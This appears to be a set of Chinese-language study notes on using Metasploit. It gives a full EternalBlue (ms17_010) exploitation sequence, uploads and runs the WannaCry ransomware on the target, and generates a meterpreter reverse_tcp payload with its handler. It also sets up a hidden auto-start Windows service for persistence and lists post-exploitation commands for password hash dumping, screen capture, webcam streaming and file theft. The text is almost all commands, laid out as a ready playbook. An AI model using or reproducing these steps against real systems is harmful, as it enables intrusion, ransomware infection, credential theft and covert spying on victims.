## 渗透工具-metasploit

##### Kali自带

##### Windows安装：windows.metasploit.com

选择msi安装包

查找漏洞：search ms



#### 永恒之蓝全流程：

1. 提权并进入终端

   - sudo su
   - msfconsole

2. 使用模块 （查找后二选一）

   - search ms17_010

   - use exploit/windows/smb/ms17_010_eternalblue
   - use 0

3. 设置必选项

   - 查看必选项 show options
   - 只配置required yes
   - set rhosts 192.168.13.132
   - set lport 10001

4. 运行模块

   - run

5. 控制成功后查看帮助

   - help
   
   - meterpreter
   
     - shell
   
     - 弹框：msg * "你好"
     - 打开计算器：calc
     - 传入木马WannaCry：upload /home/kali/Desktop/wcry.exe C:/Windows/temp
     - 运行木马：execute -f C:/Windows/temp/wcry.exe
   
       

##### 生成木马：

- msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.13.131 lport=6688 -f psh-reflection >1.ps1

##### 接收木马：

- msfconsole
- use exploit/multi/handler
- set payload windows/x64/meterpreter/reverse_tcp
- set lport 6688
- set lhosts 192.168.13.131
- run

##### 服务持久化：

1. 移动位置
   - mv 1.ps1 c:\\Windows\\1.ps1
2. 创建服务
   - sc create shell start= auto binPath= "cmd.exe /k powershell.exe -w hidden -ExecutionPolicy Bypass -NoExit -File C:\\Windows\\1.ps1" obj= Localsystem
3. 伪装服务
   - sc description "shell" "绝对安全的shell哈哈哈"
4. 设置服务自启动
   - sc config "shell" start=auto
5. 启动服务
   - net start "服务名"
6. 
7. 





### meterpreter命令：

- screenshare：实时观看远程用户桌面

- screenshot：抓取交互式桌面的截图
- download  C:/test/1.txt  /home/kali/Desktop/
- upload /home/kali/Desktop/wcry.exe C:/Windows/temp
- run post/windows/gather/checkvm ：检查目标是否虚拟机
- hashdump：win哈希密码
- webcam_list：查看是否有摄像头
- webcam_stream：打开视频

- sysinfo：查看系统信息
- getuid：查看当前用户









传文件：smb://192.168.13.130















